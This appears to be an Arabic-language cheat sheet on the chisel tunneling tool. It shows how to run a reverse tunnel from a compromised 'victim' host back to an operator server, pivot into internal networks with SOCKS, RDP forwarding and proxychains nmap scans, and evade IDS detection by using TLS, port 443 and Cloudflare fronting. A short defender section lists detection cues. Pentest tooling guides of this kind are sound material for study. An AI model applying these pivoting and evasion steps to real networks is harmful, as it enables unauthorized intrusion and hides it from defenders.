# Chisel — الدليل الشامل لإنشاء الأنفاق (Tunneling)

تُعدّ أداة `chisel` حلاً متطوراً لإنشاء أنفاق TCP/UDP عبر بروتوكول HTTP، مؤمنةً بطبقة SSH. تتميز الأداة بكونها ملفاً تنفيذياً واحداً مكتوباً بلغة Go، ويمكن تشغيلها كخادم (Server) أو كعميل (Client). تُستخدم الأداة بشكل أساسي في عمليات **التمحور (Pivoting)** وتجاوز الجدران النارية (Firewalls) عندما يكون المنفذ الوحيد المسموح للخروج (Outbound) هو HTTP/HTTPS.

## التثبيت

```terminal
curl -L https://github.com/jpillora/chisel/releases/latest/download/chisel_$(uname -s)_$(uname -m).gz | gunzip > chisel && chmod +x chisel
```

## نموذج الخادم والعميل (Server / Client)

يعمل الخادم على استقبال الاتصالات (غالباً جهاز المشغل)، بينما يعمل العميل على الجهاز المخترق (الضحية) للاتصال بالخارج.

### الخادم (Server)

```terminal
chisel server --port 8080 --reverse --auth user:Pass --tls-key key.pem --tls-cert cert.pem
```

| الخيار (Flag) | الغرض |
|------|---------|
| `--port` / `-p` | منفذ الاستماع |
| `--host` | واجهة الشبكة المخصصة للاستماع |
| `--reverse` | السماح للعميل بفتح منافذ عكسية للمشغل |
| `--auth user:pass` | سر مشترك للتحقق من الهوية |
| `--keepalive 25s` | الحفاظ على نشاط اتصال TCP |
| `--tls-key/--tls-cert` | شهادات TLS لتشفير الاتصال |
| `--socks5` | تفعيل دعم SOCKS5 المدمج |

### العميل (Client)

```terminal
chisel client --auth user:Pass --keepalive 25s \
    https://operator.example.com:8080 R:1080:socks
```

| مواصفات النفق | المعنى |
|-------------|---------|
| `1080:socks` | منفذ محلي 1080 ← SOCKS5 على جهاز **الخادم** |
| `R:1080:socks` | عكسي — فتح منفذ SOCKS5 على جهاز **المشغل** يمر عبر الضحية |
| `R:3389:10.0.0.5:3389` | عكسي — عرض خدمة RDP لـ 10.0.0.5 داخل شبكة الضحية للمشغل على منفذ 3389 |
| `R:0.0.0.0:8080:127.0.0.1:8080` | ربط المنفذ على واجهة خارجية لجهاز المشغل |

## سيناريوهات العمل (Workflows)

### تمرير SOCKS عبر الضحية (السيناريو الأكثر شيوعاً)

```terminal
# على جهاز المشغل (Operator):
chisel server -p 8080 --reverse --auth pwn:pwn

# على جهاز الضحية (بعد الحصول على موطئ قدم):
chisel client --auth pwn:pwn http://operator-ip:8080 R:1080:socks
```

الآن يمكن للمشغل استخدام `proxychains4` للوصول للشبكة الداخلية:
`proxychains4 nmap -sT -Pn 10.0.0.0/24`

### تمرير منفذ واحد لهدف داخلي

```terminal
# المشغل:
chisel server -p 8080 --reverse --auth pwn:pwn

# الضحية:
chisel client --auth pwn:pwn http://operator:8080 R:13389:10.0.0.5:3389
# المشغل: الاتصال بـ 127.0.0.1:13389 سيصل مباشرة إلى 10.0.0.5:3389 داخل الشبكة
```

### استخدام تشفير TLS (موصى به)

```terminal
# توليد شهادة ذاتية التوقيع
openssl req -x509 -nodes -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -subj '/CN=cdn'

# الخادم:
chisel server -p 443 --tls-key key.pem --tls-cert cert.pem --reverse --auth pwn:pwn

# العميل:
chisel client --auth pwn:pwn https://operator:443 R:1080:socks
```

## المخرجات السليمة

عند نجاح الاتصال، ستظهر الرسائل التالية:
```
client: Connecting to wss://operator:8080
client: Connected (Latency 12ms)
client: 1#1: Listening
```

## المشكلات والحلول

| العرض | الحل |
|---------|-----|
| العميل يعطي `connection refused` | تحقق من قيود الخروج (Egress)، جرب المنافذ الشائعة مثل (443، 80) |
| خطأ `tls: handshake failure` | استخدم `--tls-skip-verify` في جهة العميل للشهادات ذاتية التوقيع |
| بطء في نقل البيانات | قلل مدة `--keepalive` وأغلق الأنفاق غير المستخدمة |
| توقف الاتصال بعد رصد IDS | استخدم تغليف TLS، واستخدم نطاقاً وهمياً عبر Cloudflare للتمويه |

## منظور المدافع (Defender's Perspective)

- رصد اتصالات HTTP/WebSocket طويلة الأمد من محطة عمل إلى عنوان IP خارجي مجهول.
- عملية المصافحة (Handshake) في Chisel لها بصمة محددة (magic byte)؛ توجد توقيعات Suricata جاهزة لرصدها.
- استخدام TLS يزيد من صعوبة الرصد، لكن بصمة JA3 المستقرة مع فترات اتصال طويلة تظل نشاطاً مريباً.

## العمليات الأمنية (OPSEC)

- **دائماً** استخدم TLS، و**دائماً** استخدم سرية مصادقة (Auth secret) فريدة.
- استخدم "الواجهة الأمامية" (Fronting) عبر Cloudflare لكي يبدو عنوان IP الوجهة كأنه تابع لخدمات Cloudflare.
- استخدم المنفذ 443 للتمويه ضمن حركة مرور HTTPS العادية.

## أدوات ذات صلة

| الأداة | التخصص |
|------|-------|
| **ligolo-ng** | بديل حديث؛ يقوم بتوجيه شبكات فرعية كاملة دون الحاجة لـ proxychains |
| **frp** | بروكسي عكسي عام الغرض ومفتوح المصدر |
| **ngrok** | خدمة أنفاق تجارية، أسهل في الاستخدام لكنها مراقبة ومسجلة |
| **gost** | أداة إنشاء أنفاق تدعم بروتوكولات متعددة |
